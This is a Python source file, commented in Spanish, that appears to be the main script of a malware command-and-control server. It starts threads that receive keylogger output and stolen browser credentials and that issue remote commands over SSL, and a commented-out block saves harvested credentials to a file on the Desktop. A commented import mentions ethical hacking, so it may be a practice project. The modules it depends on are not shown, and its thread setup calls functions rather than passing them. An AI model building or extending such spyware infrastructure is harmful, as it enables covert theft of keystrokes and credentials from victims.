import os
import socket
import threading
from pathlib import Path
import cmd_cntr
import recv_cred
import ssl
import colorama
from colorama import Fore
import certs
import tempfile
import recv_keys
# from ETHICAL_HACKING.cryptography.CryptoPhenix import encrypt, decrypt

# Conexion de keylog
# C&C
# Navegadores
# Conexiones cifradas mediante certificado SSL


def banner():
    colorama.init()
    print(Fore.GREEN + "\n\n\t[!] STARTED C&C SERVER\n\t" + Fore.RESET)


def get_user_path():
    return "{}/".format(Path.home())


"""def recv_out(secure_conn):

    while True:
        output = secure_conn.recv(4096)
        return output


def get_credentials(secure_conn_1):
    location = get_user_path() + "Desktop/"
    filename = "Credentials.txt"

    # Recibimos las credenciales del navegador
    while True:
        cred = secure_conn_1.recv(4096)
        write_file(cred.decode(), location, filename)"""


def main():
    banner()

    # Hilo 1 de keylogs
    thread_1 = threading.Thread(target=recv_keys.main())
    thread_1.start()

    # Hilo 3 de credenciales de navegadores
    thread_2 = threading.Thread(target=recv_cred.main())
    thread_2.start()

    # Hilo 2 comand & control
    thread_3 = threading.Thread(target=cmd_cntr.start())
    thread_3.start()

    # Juntamos los hilos para su posterior detención.
    thread_2.join()
    thread_1.join()
    thread_3.join()


def write_file(text, location, filename):

    # Archivo a crear
    with open(location + filename, "a", encoding="utf-8") as log:
        log.write(text)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()